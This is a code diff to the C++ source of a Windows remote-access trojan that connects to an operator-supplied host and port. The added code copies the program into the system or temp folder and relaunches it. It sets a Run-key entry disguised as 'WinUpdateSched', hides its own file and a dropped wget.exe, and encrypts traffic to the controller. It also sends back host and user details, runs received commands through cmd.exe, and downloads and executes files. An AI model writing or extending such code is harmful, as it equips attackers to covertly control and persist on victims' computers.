@@ -28,11 +28,13 @@
 #define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define						KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define						KEY_VALUE_NAME					"WinUpdateSched"
+//#define						GHOST_HIDE /* DEBUG */
 
 #include					"ahxrwinsock.h"
 #include					"resource.h"
 #include					"json.hpp"
 #include					"info.h"
+#include					"encrypt.h"
 
 #include					<ShlObj.h>
 #include					<Shellapi.h>
@@ -71,8 +73,51 @@ void main(cli::array<System::String^>^ args)
 	str_host = (const char * ) Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
 	str_port = (const char * ) Marshal::StringToHGlobalAnsi(args[1]).ToPointer();
 
+#ifndef GHOST_HIDE
+	HMODULE			h_mod;
+	char *			c_path[MAX_PATH];
+	char 			c_new_path[MAX_PATH + FILENAME_MAX + 1];
+	string			s_path;
+	string			s_file_name;
+
+	h_mod = GetModuleHandleW(NULL);
+	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);
+
+	s_path = (char *)c_path;
+	s_file_name = s_path.substr(s_path.find_last_of('\\') + 1); // Getting the file name.
+	s_path = s_path.substr( 0, s_path.find_last_of('\\')); // Just the path of the executed location.
+
 	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
 	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe
+
+	if (strcmp(s_path.c_str(), str_windows) != 0 && ( strcmp( string(string(s_path) + "\\").c_str(), str_temp) != 0 )) {
+		sprintf(c_new_path, "%s\\%s", str_windows, s_file_name.c_str());
+
+		fstream f_file_read((char *)c_path, ios::in | ios::binary);
+		fstream f_file_write(c_new_path, ios::out | ios::binary);
+		
+		if (f_file_write.good() || f_file_write.is_open()) { // No permission
+			f_file_write << f_file_read.rdbuf();
+
+			f_file_read.close();
+			f_file_write.close();
+		}
+		else {
+			sprintf(c_new_path, "%s%s", str_temp, s_file_name.c_str());
+			fstream f_file_write(c_new_path, ios::out | ios::binary);
+
+			f_file_write << f_file_read.rdbuf();
+
+			f_file_read.close();
+			f_file_write.close();
+		}
+
+		char paramFormat[ 23 ];
+		sprintf(paramFormat, "%s %s", str_host, str_port);
+
+		ShellExecute(NULL, "open", c_new_path, paramFormat, 0, 0);
+		exit(EXIT_SUCCESS);
+	}
 
 	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
 	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);
@@ -90,17 +135,21 @@ void main(cli::array<System::String^>^ args)
 		l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
 
 	if (l_key == ERROR_SUCCESS) {
-
-		HMODULE h_mod = GetModuleHandleW(NULL);
-		char * c_path[MAX_PATH];
-		GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);
-
 		char * full_path = new char[MAX_PATH + 50];
 		sprintf(full_path, "\"%s\" %s %s", c_path, str_host, str_port);
 
 		RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
 		RegCloseKey(h_key);
 	}
+
+	SetFileAttributes((char *)c_path, FILE_ATTRIBUTE_HIDDEN);
+#else
+	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
+	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe
+
+	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
+	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);
+#endif
 
 	// Starting and idling server
 	while (1) {
@@ -138,7 +187,7 @@ void onClientConnect() {
 	DWORD			c_comp_size;
 	DWORD			c_username_size = UNLEN + 1;
 	char			c_username[UNLEN + 1];
-
+	
 	c_comp_size		= sizeof(c_comp_name);
 	GetComputerName(c_comp_name, &c_comp_size);
 	GetUserName(c_username, &c_username_size);
@@ -194,17 +243,25 @@ void onClientConnect() {
 	}
 	sys_data["OS"] = os_output;
 
-	client.send_data(sys_data.dump().c_str());
+	client.send_data(encryptCMD(sys_data.dump()).c_str());
 
 	CreateThread(0, 0, t_ping, 0, 0, 0);
 }
 
 void onClientRecData( char * data ) {
+
+	// Removing encryption.
+	if (strcmp(data, "CMD") != 0) {
+		string s_data = data;
+		s_data = unencryptCMD(s_data);
+		strcpy(data, s_data.data());
+	}
+	
 	int i_len			= strlen(data) + MAX_PATH + 1;
 	char * c_output		= new char[i_len];
-	char * c_new_data = new char[strlen(data) + 1];
+	char * c_new_data	= new char[strlen(data) + 1];
 
-	c_new_data = data;
+	strcpy(c_new_data, data);
 	c_output[i_len - 1] = '\0';
 
 	/*
@@ -258,10 +315,10 @@ void onClientRecData( char * data ) {
 					if (c_read[i_length - 1] == '\n')
 						c_read[i_length - 1] = '\0';
 
-					client.send_data(c_read);
+					client.send_data(encryptCMD( string( c_read ) ).c_str());
 				}
 				else
-					client.send_data("Invalid command or empty response.");
+					client.send_data(encryptCMD(string("Invalid command or empty response.")).c_str());
 
 			}
 
@@ -281,6 +338,8 @@ void onClientRecData( char * data ) {
 				fstream f_wget("wget.exe", ios::out | ios::binary);
 				f_wget.write((char *)lp_res, dw_res);
 				f_wget.close();
+
+				SetFileAttributes("wget.exe", FILE_ATTRIBUTE_HIDDEN);
 
 				// Fetching the sent data.
 				json j_response = json::parse(c_new_data);
@@ -309,7 +368,7 @@ void onClientRecData( char * data ) {
 					j_response["FILE"].get<string>().c_str()
 					);
 
-				client.send_data(c_output);
+				client.send_data(encryptCMD(string(c_output)).c_str());
 
 				// Running the downloaded file and removing wget.exe
 				ShellExecute(NULL, "open", j_response["FILE"].get<string>().c_str(), 0, 0, 0);
